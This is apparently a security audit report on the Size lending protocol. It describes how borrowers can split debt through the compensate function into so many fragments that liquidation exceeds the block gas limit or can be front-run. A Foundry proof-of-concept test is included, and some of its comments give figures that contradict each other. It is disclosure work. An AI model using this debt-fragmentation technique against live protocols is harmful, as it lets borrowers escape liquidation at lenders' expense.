# Vulnerability details

## Impact

Borrowing in Size protocol is a key feature. willing lenders are matched with borrowers. Assuming they have deposited enough collateral, once a borrower finds a willing lender, Borrowers can initiate a sellCreditMarket operation, in which they pay a fee upfront to initiate their borrow position and receive their borrowed tokens.

If they would like to repay their debt, they can do so via the repay function, but only if they repay the entire future value of their debt.

However a new feature was added via the compensation mechanism, allowing a borrower to fragment their debt position in order to facilitate partial repayments of their debt. This is because like mentioned earlier, the repayment function only allows full repayment of the debt's future value.

So if we assume a borrower borrows 1 million USDC, and they need to repay 10,000, they can call compensate which will create a new debt position of 10,000 and a credit position linked to it worth 10,000. they can then repay that new debt position and their outstanding loan on their original debt position will then be 990,000. both actions can be combined in a multicall for ease of use.

This process of debt fragmentation(unlike opening a new debt position) is currently costless to the borrower(due to a seperate bug i will refer to in another issue) but more importantly, and is the key argument made in this report:

There are no limits to the number of debt fragments they can generate.

The issue arises due to the fact that malicious borrowers can exploit this feature to make liquidation attempts on their underwater position extremely difficult and/or unprofitable.

If the malicious borrower gradually fragments their debt position across time without any repayment, they can eventually consolidate an arbitrary large number of debt positions which would make timely full liquidation of their position problematic. Any attempts to timely liquidate their entire position will need to call a batch liquidation via multicall, which can be DOS'd if the gas block limit is exceeded for instance. Gas prices often spike during turbulent market conditions, and this is also when liquidations are most likely to occur further exasperating the problem. The high gas costs can also deter liquidation attempts since cost could exceed the liquidation rewards.

Furthermore, even if partial liquidations are attempted, the can fail via DOS attacks, Attacker just needs to front run and repay a single slice of their debt contained in the batch, causing the entire batch call to revert, adding an additional layer of complexity.



## Proof of Concept
           function test_Compensate_compensate_mintCredit_can_be_used_to_partially_repay_with_compensate_too_big() public {
        _updateConfig("borrowATokenCap", type(uint256).max);
        _setPrice(1e18);
        _updateConfig("swapFeeAPR", 0);
        _deposit(alice, usdc, 20000000e6);
        _deposit(bob, weth, 6000000e18);
        _buyCreditLimit(alice, block.timestamp + 365 days, YieldCurveHelper.pointCurve(365 days, 0.5e18));
        DebtPosition[] memory debtPositions = size.getDebtPositions();

        assertEq(size.getUserView(bob).borrowATokenBalance, 0);
        assertEq(size.getUserView(bob).debtBalance, 0);

        assertEq(debtPositions.length, 0);

        uint256 debtPositionId = _sellCreditMarket(bob, alice, RESERVED_ID, 1000000e6, 365 days, false);
        uint256 creditPositionId = size.getCreditPositionIdsByDebtPositionId(debtPositionId)[0];


        uint256[] memory receivableCreditPositionIds = new uint256[](1);
        receivableCreditPositionIds[0] = type(uint256).max;

        uint256 slice = 1000e6;
        uint256 remainingDebt = size.getUserView(bob).debtBalance;
        uint256 remainingBorrow = size.getUserView(bob).borrowATokenBalance;
        uint256 remainingCollateral = size.getUserView(bob).collateralTokenBalance;
        uint256 futureValue = size.getDebtPosition(debtPositionId).futureValue;

         Vars memory _before = _state();

        // @audit as long as original debt has some future value left, keep splitting it into smaller debts
        while (futureValue > 0){
            vm.prank(bob);
            size.compensate(
            CompensateParams({
                creditPositionWithDebtToRepayId: creditPositionId,
                creditPositionToCompensateId: RESERVED_ID,
                amount: slice
            })
        );

        futureValue = size.getDebtPosition(debtPositionId).futureValue;

        }

         Vars memory _after = _state();

        debtPositions = size.getDebtPositions();
        // @audit user has split their original debt into 1500 positions!
        assertEq(debtPositions.length, 1501);

        uint256 totalDebtSplitted = 0;
        for (uint256 i = 0; i < debtPositions.length; i++) {
            uint256 futureValue = size.getDebtPosition(i).futureValue;
            totalDebtSplitted += futureValue;
        }

        // @audit fee recipient collateral token balance remains the same, hence no fees were paid for compensation
        assertEq(_after.feeRecipient.collateralTokenBalance, _before.feeRecipient.collateralTokenBalance);

        uint256 futureValueInitialDebt = size.getDebtPosition(debtPositionId).futureValue;
        // @audit initial debt position no longer has any future value, is considered empty and can not be liquidated
        assertEq(futureValueInitialDebt, 0);
        // @audit borrower collateral token balance remains the same after compensation, highlighting they did
        // not have to pay for any fragmentation fees
        assertEq(_after.bob.collateralTokenBalance, _before.bob.collateralTokenBalance);
        // @audit borrowers borrowAToken balance remains the same suggesting no change 
        // in their borrow balance after compensation
        assertEq(_after.bob.borrowATokenBalance, _before.bob.borrowATokenBalance);
        // @audit borrowers debt balance remains the same suggesting no change 
        // in their debt balance after compensation
        assertEq(_after.bob.debtBalance, _before.bob.debtBalance);
        // @audit borrowers debt balance is equal to the total debt splitted via compensation
        assertEq(size.getUserView(bob).debtBalance, totalDebtSplitted);
        //@audit lower price to enable liquidation
        _setPrice(0.2e18);

        _deposit(liquidator, usdc, 100000000e6);

        uint256 gasUsed = 0;
        for (uint256 i = 0; i < debtPositions.length; i++) {
            uint256 futureValue = size.getDebtPosition(i).futureValue;
            if (futureValue > 0) {
                uint256 initialGas = gasleft();
                _liquidate(liquidator, i);
                assertEq(size.getLoanStatus(i), LoanStatus.REPAID);
                gasUsed += initialGas - gasleft();
            }

        }
        uint256 ethBlockGasLimit = 30000000;
        // @audit 1. by splitting up the debt, attempts to liquidate the full position will exceed the 
        // block gas limit
        //@audit 2. in addition, by splitting up the debt to such a large number of smaller debts,
        // borrower can front run any batch liquidation attempt by simply paying off a single small debt
        // @audit 3. incentives for liquidation now based on future value of loan, so each liquidation
        // will have minimal incentive, will only be profitable by batching small debts.
        // these situations comnined mean liquidating a large position becomes both extremely expensive and difficult
        // in this test, borrower borrows 12 million USDC, splits it into 18000 smaller debts of 10000 USDC each
        // via calling compensate across several blocks.
        // liquidator attempting to liquidate the full position will exceed the block gas limit
        assertGt(gasUsed, ethBlockGasLimit);

    }


In the POC above, the following is demonstrated:

1. Bob Deposits collateral.
2. Bob takes out a large loan of 1 million USDC(The max amount borrowable in size protocol), through the willing lender Alice and pays an upfront a fee, via sellCreditMarket.
3. Bob then splits up their loan into a staggering 1500 smaller debt positions via the compensate function.
4. Price of collateral falls, so liquidation is now possible.
5. Liquidator attempts to liquidate all debt fragments.
6. Batch liquidation consumes gas in excess of ETH block gas limit of 30000000.

note: no fees are paid due to another bug reported in another issue, but if we assume the flat 5 dollar fragmentation fee is applied, it would still be insufficient to dissuade attackers. in this example the fee amounts to 5X1,500= 7,500$. However the debt position and collateral supporting in the POC above far exceeds this fee paid, hence attackers would still be incentivized to pull this as a downside protection against liquidation. 


